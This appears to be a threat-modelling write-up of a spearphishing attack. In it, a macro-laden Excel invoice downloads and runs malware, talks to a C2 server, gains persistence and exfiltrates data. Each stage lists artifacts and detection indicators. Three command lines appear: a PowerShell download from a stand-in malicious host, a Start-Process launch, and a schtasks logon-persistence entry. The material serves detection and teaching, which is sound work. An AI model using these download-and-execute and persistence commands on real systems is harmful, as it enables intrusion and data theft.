Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario involves an attacker sending a spearphishing email with a malicious attachment. The user opens the attachment, which exploits a vulnerability in Microsoft Excel to execute a payload. The payload then communicates with a command and control (C2) server to download additional malicious components, leading to further exploitation of the system.

Attack Flow Breakdown:

1. **Initial Access via Email**
   - **Application Involved**: Outlook
   - **User Action**: The user receives an email with a subject line "Invoice Attached" and opens the email.
   - **Key Artifacts**: Email headers, attachment filename (e.g., "Invoice_12345.xls").
   - **Network Indicators**: Email server logs showing the delivery of the spearphishing email.

2. **Opening the Malicious Attachment**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user double-clicks the attachment to open it.
   - **Key Artifacts**: Excel file (e.g., "Invoice_12345.xls") containing embedded macros.
   - **Network Indicators**: Excel process creation logs.

3. **Macro Execution**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user enables macros when prompted by Excel.
   - **Key Artifacts**: VBA code execution logs, macro settings in Excel.
   - **Network Indicators**: Outbound connections initiated by Excel to a malicious URL (e.g., `http://malicious-domain.com/payload`).

4. **Payload Download and Execution**
   - **Application Involved**: PowerShell
   - **User Action**: The macro executes a PowerShell command to download a malicious executable.
   - **Key Artifacts**: PowerShell command history, downloaded file (e.g., "malware.exe").
   - **Network Indicators**: PowerShell logs showing the execution of `Invoke-WebRequest` or `curl` commands.

   ```shell
   # PowerShell command to download the payload
   Invoke-WebRequest -Uri "http://malicious-domain.com/payload" -OutFile "C:\Users\Victim\Downloads\malware.exe"
   ```

5. **Execution of the Malicious Payload**
   - **Application Involved**: Windows Explorer
   - **User Action**: The downloaded executable is automatically executed by the macro.
   - **Key Artifacts**: Process creation logs for "malware.exe".
   - **Network Indicators**: Outbound connections to the C2 server (e.g., `http://c2-server.com`).

   ```shell
   # Command to execute the downloaded malware
   Start-Process "C:\Users\Victim\Downloads\malware.exe"
   ```

6. **Establishing Command and Control**
   - **Application Involved**: Malware (custom executable)
   - **User Action**: The malware connects to the C2 server to receive further instructions.
   - **Key Artifacts**: Network traffic logs showing connections to the C2 server.
   - **Network Indicators**: DNS queries and HTTP requests to the C2 server.

7. **Persistence Mechanism**
   - **Application Involved**: Windows Task Scheduler
   - **User Action**: The malware creates a scheduled task to ensure it runs on system startup.
   - **Key Artifacts**: Scheduled task entries in Windows Task Scheduler.
   - **Network Indicators**: Logs showing the creation of a new task (e.g., "malware_task").

   ```shell
   # Command to create a scheduled task for persistence
   schtasks /create /tn "malware_task" /tr "C:\Users\Victim\Downloads\malware.exe" /sc onlogon
   ```

8. **Data Exfiltration**
   - **Application Involved**: Malware
   - **User Action**: The malware collects sensitive data and sends it back to the C2 server.
   - **Key Artifacts**: Logs of files accessed and data sent.
   - **Network Indicators**: Outbound traffic to the C2 server containing exfiltrated data.
